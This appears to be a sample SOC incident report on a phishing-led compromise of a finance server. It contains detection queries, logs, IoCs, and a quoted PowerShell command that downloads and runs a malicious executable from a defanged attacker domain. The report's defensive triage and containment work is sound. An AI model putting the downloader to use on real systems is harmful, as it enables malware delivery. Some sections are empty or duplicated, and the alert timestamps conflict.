# SOC Investigation Report

## Alert Overview

- **Ticket ID:** IR-2025-1142
- **Source:** Microsoft Defender for Endpoint
- **Alert Title:** Suspicious PowerShell activity initiating network connections
- **Observed At:** 2025-11-11T18:42:00.000Z
- **Severity:** Medium
- **Description:** On Nov 11 at 13:42 UTC, Defender detected a PowerShell process on host FIN-SRV02 executing encoded commands to a remote IP address associated with a known C2 infrastructure. The activity originated from user j.smith@contoso.com via an RDP session. Initial indications suggest credential compromise through phishing earlier the same day.


## User/Entity Details

- **User ID:** S-1-5-21-214752146-1234567890-987654321-1180
- **User Name:** John Smith
- **Email:** j[.]smith[@]contoso[.]com
- **Title:** Finance Analyst
- **Device ID:** FIN-SRV02.contoso.local
- **Hostname:** FIN-SRV02

## Evidence

### Search Queries

<details>
<summary>Splunk 1</summary>

```spl
index=edr sourcetype=defender:events
| search DeviceName="FIN-SRV02"
| stats values(CommandLine), values(InitiatingProcessFileName), values(RemoteIP) by InitiatingProcessParentFileName
| sort by _time desc
```

</details>

<details>
<summary>KQL 2</summary>

```spl
DeviceProcessEvents
| where Timestamp > datetime(2025-11-11T12:30:00Z)
| where DeviceName == "FIN-SRV02"
| where ProcessCommandLine has_any ("powershell", "Invoke-WebRequest", "FromBase64String")
| project Timestamp, DeviceName, InitiatingProcessFileName, ProcessCommandLine, ReportId, InitiatingUser
| order by Timestamp desc
```

</details>

### Raw Logs

<details>
<summary>EDR 1</summary>

```json
{
  "Timestamp": "2025-11-11T13:42:18Z",
  "DeviceName": "FIN-SRV02",
  "InitiatingProcessFileName": "powershell.exe",
  "ProcessCommandLine": "powershell.exe -nop -w hidden -enc SQB...dA==",
  "RemoteIP": "185.199.109.15",
  "UserName": "CONTOSO\\j.smith",
  "ActionType": "NetworkConnectionInitiated",
  "ReportId": 125894
}
```

</details>

<details>
<summary>Firewall 2</summary>

```json
2025-11-11T13:42:20Z ALLOW TCP 10.0.5.22:49823 -> 185.199.109.15:443
Rule: OUTBOUND-HTTPS-ALLOW
AppID: powershell.exe
BytesSent: 10324 BytesReceived: 12312
SessionDuration: 12s
```

</details>

<details>
<summary>Auth 3</summary>

```json
Subject:  Security ID:  S-1-5-21-214752146-1234567890-987654321-1180
           Account Name:  j.smith
Logon Type: 10 (RemoteInteractive)
Workstation Name: FIN-SRV02
Logon Process:  User32 
Authentication Package: Negotiate
Source Network Address: 172.16.5.13
```

</details>

<details>
<summary>Proxy 4</summary>

```json
2025-11-11T13:43:03Z GET hxxps[:]//cdn-dropbox[.]io/assets/finance_report_update.ps1
Response: 200 OK  Size: 14,820 bytes
```

</details>

### Indicators of Compromise (IoCs)

**Domains:**
- cdn-dropbox[.]io

**IP Addresses:**
- 185[.]199[.]109[.]15

**URLs:**
- hxxps://cdn-dropbox[.]io/assets/finance_report_update[.]ps1

**File Hashes:**
- `6f24d69d1c9151e379a7dc45686b8ea624a7f9dc13bfc2a45c9ee5e99bdfc123`

**Commands/Scripts:**

<details>
<summary>Command 1</summary>

```powershell
$wc = New-Object System.Net.WebClient;
$url = 'hxxps[:]//cdn-dropbox[.]io/assets/payload.exe';
$file = "$env:TEMP\\update.exe";
$wc.DownloadFile($url, $file);
Start-Process $file;
| Network Behavior | HTTPS POST beacon to 185[.]199[.]109[.]15 every 60s |
| Email Subject (Phish) | “Updated Finance Forecast Q4 2025” |
```

</details>

### OSINT & Sandbox Analysis

**VirusTotal**:
	•	cdn-dropbox[.]io/assets/payload.exe
	•	34 / 71 engines detected (e.g., Trojan.Agent, PowerShell/Loader.A)
	•	First seen: 2025-11-10
	•	Last seen: 2025-11-11
	•	Network Behavior: HTTPS C2 to 185[.]199[.]109[.]15
	•	Classification: Downloader → RAT (AsyncRAT variant)


**Hybrid Analysis**:
	•	Dynamic Behavior:
	•	Creates update.exe in %TEMP%
	•	Modifies registry for persistence
	•	Spawns cmd.exe /c schtasks /create /tn UpdateService
	•	Encoded PowerShell observed

**Screenshot**:
•	https://sandbox-screenshot[.]com/FIN-SRV02_exec1.png
(Caption: PowerShell window executing encoded command)

## Analysis & Triage Steps

- 

## Actions Taken

- **[2025-11-11T18:50:00.000Z]** Analyst quarantined file update.exe via Defender portal

- **[2025-11-11T18:53:00.000Z]** Disabled user account j.smith in Entra ID

- **[2025-11-11T19:02:00.000Z]** Contained host FIN-SRV02 in Defender portal

- **[2025-11-11T19:15:00.000Z]** Extracted forensic memory image for IR

- **[2025-11-11T19:30:00.000Z]** Notified Finance IT manager of account compromise

- **[2025-11-11T21:04:00.000Z]** Closed firewall egress rule temporarily for external IP 185.199.109.15


## Escalations

- **[2025-11-13T18:20:04.216Z]** Escalated to ****: 

## Final Summary

At 13:42 UTC on Nov 11, suspicious PowerShell activity was detected on a finance department server (FIN-SRV02) tied to user j.smith. The investigation revealed a phishing-led credential compromise that allowed execution of a remote PowerShell payload from a malicious domain (cdn-dropbox[.]io).
The incident was contained within 30 minutes. No evidence of data exfiltration was observed. MFA enforcement was re-enabled, and host isolation prevented lateral spread. Lessons learned include strengthening conditional access for privileged endpoints and restricting PowerShell web access policies.

<div class="section-leadership">

## Executive Summary for Leadership

At 13:42 UTC on Nov 11, suspicious PowerShell activity was detected on a finance department server (FIN-SRV02) tied to user j.smith. The investigation revealed a phishing-led credential compromise that allowed execution of a remote PowerShell payload from a malicious domain (cdn-dropbox[.]io).
The incident was contained within 30 minutes. No evidence of data exfiltration was observed. MFA enforcement was re-enabled, and host isolation prevented lateral spread. Lessons learned include strengthening conditional access for privileged endpoints and restricting PowerShell web access policies.

</div>

<div class="section-lessons">

## Lessons Learned

	•	Enforce MFA for all users, no exceptions for service migrations.
	•	Implement application allowlisting to prevent PowerShell web downloads.
	•	Update Defender attack surface rules to block encoded commands.
	•	Run retrospective IOC sweep for related infrastructure (185[.]199[.]*).
	•	Conduct phishing awareness training for Finance users.
	•	Review firewall egress policies and block all unknown country IPs.

</div>

<div class="section-nextsteps">

## Next Steps

	•	Enforce MFA for all users, no exceptions for service migrations.
	•	Implement application allowlisting to prevent PowerShell web downloads.
	•	Update Defender attack surface rules to block encoded commands.
	•	Run retrospective IOC sweep for related infrastructure (185[.]199[.]*).
	•	Conduct phishing awareness training for Finance users.
	•	Review firewall egress policies and block all unknown country IPs.

</div>

